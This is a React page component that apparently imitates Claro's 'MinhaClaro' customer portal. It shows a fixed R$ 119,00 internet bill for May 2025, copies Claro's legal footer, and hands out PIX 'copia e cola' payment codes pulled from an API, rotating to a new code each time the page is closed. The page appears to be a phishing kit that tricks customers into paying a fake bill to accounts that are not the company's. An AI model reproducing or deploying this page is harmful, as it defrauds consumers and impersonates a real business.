import { useEffect, useState } from "react";

export default function Home() {
  const [pixKeys, setPixKeys] = useState([]);
  const [currentIndex, setCurrentIndex] = useState(null);
  const [loading, setLoading] = useState(true);
  const [modalVisible, setModalVisible] = useState(false);

  // Carrega as chaves da API
  async function loadPixKeys() {
    setLoading(true);
    const res = await fetch("/api/pix-keys");
    const keys = await res.json();
    setPixKeys(keys);

    // Tenta recuperar índice do sessionStorage
    const savedIndex = sessionStorage.getItem("pixCurrentIndex");
    if (savedIndex !== null && keys[parseInt(savedIndex)]) {
      setCurrentIndex(parseInt(savedIndex));
    } else {
      setCurrentIndex(0);
      sessionStorage.setItem("pixCurrentIndex", "0");
    }

    setLoading(false);
  }

  useEffect(() => {
    loadPixKeys();
  }, []);

  // Copia chave e mostra modal (não muda chave agora)
  async function copyPIX() {
    if (pixKeys.length === 0 || currentIndex === null) return;

    const code = pixKeys[currentIndex];
    try {
      await navigator.clipboard.writeText(code);
      setModalVisible(true);
    } catch {
      alert("Erro ao copiar o código PIX");
    }
  }

  // Ao fechar modal
  function hideModal() {
    setModalVisible(false);
  }

  function closeModal(e) {
    if (e.target.id === "modalOverlay") {
      hideModal();
    }
  }

  // Quando a aba ou página for descarregada, atualiza o índice para o próximo
  useEffect(() => {
    function handleBeforeUnload() {
      if (pixKeys.length === 0 || currentIndex === null) return;

      // Calcula próximo índice (rotaciona)
      const nextIndex = (currentIndex + 1) % pixKeys.length;
      sessionStorage.setItem("pixCurrentIndex", nextIndex.toString());
    }

    window.addEventListener("beforeunload", handleBeforeUnload);
    return () => window.removeEventListener("beforeunload", handleBeforeUnload);
  }, [currentIndex, pixKeys]);

  if (loading) return <p style={{textAlign:"center", marginTop:"50px"}}>Carregando chaves PIX...</p>;
  if (pixKeys.length === 0)
    return (
      <p style={{ textAlign: "center", marginTop: "50px" }}>
        Sem chaves PIX disponíveis.
      </p>
    );

  return (
    <>
      <style>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
          font-family: "Segoe UI", sans-serif;
        }
        body {
          background-color: #f4f4f4;
          display: flex;
          flex-direction: column;
          align-items: center;
          padding: 30px;
        }
        header {
          background-color: #e30613;
          width: 100%;
          padding: 15px 30px;
          color: white;
          font-size: 24px;
          font-weight: bold;
        }
        .container {
          background: #fff;
          padding: 30px;
          border-radius: 12px;
          max-width: 500px;
          width: 100%;
          box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
          margin-top: 30px;
        }
        .titulo {
          font-weight: 600;
          font-size: 18px;
          margin-bottom: 10px;
        }
        .valor {
          font-size: 32px;
          font-weight: bold;
          color: #1a1a1a;
          margin: 10px 0;
        }
        .vencimento {
          color: #555;
          font-size: 14px;
        }
        .pix-box {
          background-color: #f2faff;
          border: 1px solid #c6e2ff;
          padding: 15px;
          margin: 25px 0;
          border-radius: 8px;
        }
        .pix-code {
          font-family: monospace;
          background: #fff;
          border: 1px dashed #ccc;
          padding: 10px;
          margin-bottom: 10px;
          word-break: break-word;
          border-radius: 6px;
          font-size: 14px;
        }
        button.copy-btn {
          background-color: #e30613;
          color: white;
          border: none;
          padding: 10px 16px;
          font-size: 14px;
          border-radius: 6px;
          cursor: pointer;
          transition: 0.2s;
        }
        button.copy-btn:hover {
          background-color: #b8000f;
        }
        .resumo {
          font-size: 15px;
          margin-top: 25px;
        }
        .footer {
          margin-top: 30px;
          font-size: 12px;
          text-align: center;
          color: #777;
        }
        /* Modal */
        .modal-overlay {
          display: ${modalVisible ? "flex" : "none"};
          position: fixed;
          top: 0; left: 0;
          width: 100%; height: 100%;
          background: rgba(0, 0, 0, 0.6);
          justify-content: center;
          align-items: center;
          z-index: 999;
        }
        .modal {
          background: white;
          padding: 20px 25px;
          border-radius: 12px;
          text-align: center;
          max-width: 400px;
          box-shadow: 0 0 20px rgba(0,0,0,0.3);
          animation: pop 0.3s ease-out;
        }
        @keyframes pop {
          from { transform: scale(0.8); opacity: 0; }
          to { transform: scale(1); opacity: 1; }
        }
        .modal h2 {
          margin-bottom: 15px;
          font-size: 20px;
          color: #e30613;
        }
        .modal p {
          font-size: 15px;
          margin-bottom: 20px;
          color: #333;
        }
        .modal button {
          padding: 10px 20px;
          background-color: #e30613;
          color: white;
          border: none;
          border-radius: 6px;
          cursor: pointer;
        }
        .modal button:hover {
          background-color: #b8000f;
        }
        @media (max-width: 600px) {
          .container {
            padding: 20px;
          }
          .valor {
            font-size: 26px;
          }
        }
      `}</style>

      <header>MinhaClaro</header>

      <div className="container">
        <div className="titulo">Fatura residencial</div>
        <div>Contrato</div>
        <div style={{ marginTop: 10 }}>
          <strong>Maio 2025</strong>
        </div>
        <div className="valor">R$ 119,00</div>
        <div className="vencimento">
          Pronta para pagar <br />
          Vence dia 23 de Maio
        </div>

        <div className="pix-box">
          <div>
            <strong>Pague com PIX</strong>
          </div>
          <div className="pix-code" id="pixCode">
            {pixKeys[currentIndex]}
          </div>
          <button className="copy-btn" onClick={copyPIX}>
            Copiar código PIX
          </button>
        </div>

        <div className="resumo">
          <strong>Resumo da fatura</strong>
          <br />
          Internet
          <br />
          Claro net virtua
          <br />
          <br />
          <strong>Total: R$ 119,00</strong>
        </div>
      </div>

      <div className="footer">
        Plataforma: Claro | Política de Privacidade
        <br />
        © 2025 Claro. Todos os direitos reservados – CNPJ: 40.432.544/0001-47
        <br />
        Rua Henri Dunant, 780 - São Paulo - SP
      </div>

      <div
        id="modalOverlay"
        className="modal-overlay"
        onClick={closeModal}
      >
        <div className="modal">
          <h2>Instruções de pagamento</h2>
          <p>
            Abra o app do seu banco, escolha a opção{" "}
            <strong>PIX Copia e Cola</strong> e cole o código para concluir o
            pagamento da sua fatura.
          </p>
          <button onClick={hideModal}>Entendi</button>
        </div>
      </div>
    </>
  );
}
